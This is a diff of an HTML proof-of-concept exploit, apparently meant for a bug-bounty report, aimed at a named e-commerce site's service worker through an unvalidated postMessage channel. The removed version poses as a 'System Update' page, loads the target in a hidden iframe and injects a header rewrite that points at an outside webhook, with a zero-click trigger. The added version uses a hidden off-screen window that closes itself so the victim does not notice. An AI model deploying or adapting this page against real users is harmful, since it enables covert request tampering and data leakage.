@@ -1,48 +1,58 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Update</title></head>
-<body>
-    <iframe id="target" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>
+<head>
+    <title>PoC Audit Status</title>
+</head>
+<body style="background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
+    <h1>[ SYSTEM STATUS: READY ]</h1>
+    <p>Payload: X-PNS-Audit-Status Injection</p>
+    
+    <button onclick="runAttack()" style="padding: 15px 30px; cursor: pointer; font-weight: bold;">
+        EXECUTE SILENT INJECTION
+    </button>
 
     <script>
-        const targetFrame = document.getElementById('target');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        function runAttack() {
+            // 1. Membuka jendela ke target agar postMessage memiliki tujuan (targetWindow)
+            const targetWin = window.open("https://shop-id.tokopedia.com", "_blank", "width=10,height=10,left=-1000,top=-1000");
 
-        function sendExploit() {
-            console.log("Attempting Zero-Click Injection...");
-            
-            // Payload sesuai pns_logic.js: source harus 'main_thread'
-            const payload = {
-                source: "main_thread", 
-                eventName: "network_rule",
-                data: [{
-                    ruleName: "zero_click_bypass",
-                    global: true,
-                    conditions: [],
-                    handlers: [{
-                        handler: "replace",
-                        type: "header",
-                        field: "X-Pns-Referrer",
-                        value: webhook
-                    }]
-                }]
-            };
-
-            // Mengirim postMessage ke Iframe target
-            targetFrame.contentWindow.postMessage(payload, "*");
-        }
-
-        targetFrame.onload = function() {
-            console.log("Target successfully loaded (Status 200).");
-            // Jeda 2 detik agar Service Worker siap menerima pesan
-            setTimeout(sendExploit, 2000);
-            
-            // Trigger otomatis: Memaksa fetch agar SW mengirim data ke Webhook
+            // 2. Memberikan waktu agar Service Worker di domain target termuat sepenuhnya
             setTimeout(() => {
-                const img = new Image();
-                img.src = "https://shop-id.tokopedia.com/generate_204?trigger=" + Math.random();
-            }, 4000);
-        };
+                if (targetWin) {
+                    const payload = {
+                        source: "main_thread", // Harus sesuai dengan pengecekan di pns_logic.js
+                        eventName: "network_rule",
+                        data: [{
+                            ruleName: "audit_test",
+                            global: true,
+                            conditions: [],
+                            handlers: [{
+                                handler: "replace",
+                                type: "header",
+                                field: "X-PNS-Audit-Status",
+                                value: "HackerOne-Researcher"
+                            }]
+                        }]
+                    };
+
+                    // 3. Mengirim pesan ke jendela target tanpa memvalidasi origin
+                    targetWin.postMessage(payload, "*");
+                    
+                    console.log("Injeksi berhasil dikirim ke Service Worker target.");
+
+                    // 4. Memicu Fetch Event secara otomatis dengan mengalihkan halaman (Zero-Click Trigger)
+                    setTimeout(() => {
+                        targetWin.location.href = "https://shop-id.tokopedia.com/robots.txt";
+                    }, 1000);
+
+                    // 5. Menutup jendela secara otomatis setelah injeksi selesai agar tidak terdeteksi korban
+                    setTimeout(() => {
+                        targetWin.close();
+                        alert("Attack Sent! Check your Network tab for X-PNS-Audit-Status header.");
+                    }, 2000);
+                }
+            }, 3000);
+        }
     </script>
 </body>
 </html>
